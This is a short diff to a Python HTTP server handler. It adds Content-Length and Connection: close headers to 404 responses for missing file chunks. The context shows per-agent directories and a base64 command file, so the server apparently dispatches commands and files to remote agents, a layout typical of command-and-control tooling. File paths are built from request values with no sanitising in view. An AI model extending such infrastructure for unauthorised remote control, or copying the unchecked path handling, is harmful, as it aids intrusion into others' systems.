@@ -171,7 +171,10 @@ class Handler(BaseHTTPRequestHandler):
                 fp = os.path.join(files_dir(aid), name + '.part.' + seq)
                 if not os.path.isfile(fp):
                     self.send_response(404)
+                    self.send_header('Content-Length', '0')
+                    self.send_header('Connection', 'close')
                     self.end_headers()
+                    self.close_connection = True
                     return
                 return send_bytes(self, open(fp, 'rb').read())
             if self.path.startswith('/file?') or self.path == '/file':
@@ -197,7 +200,10 @@ class Handler(BaseHTTPRequestHandler):
             fp = os.path.join(files_dir(aid), name + '.part.' + seq)
             if not os.path.isfile(fp):
                 self.send_response(404)
+                self.send_header('Content-Length', '0')
+                self.send_header('Connection', 'close')
                 self.end_headers()
+                self.close_connection = True
                 return
             return send_bytes(self, open(fp, 'rb').read())
         cmd_path = os.path.join(agent_dir(aid), 'cmd.b64')
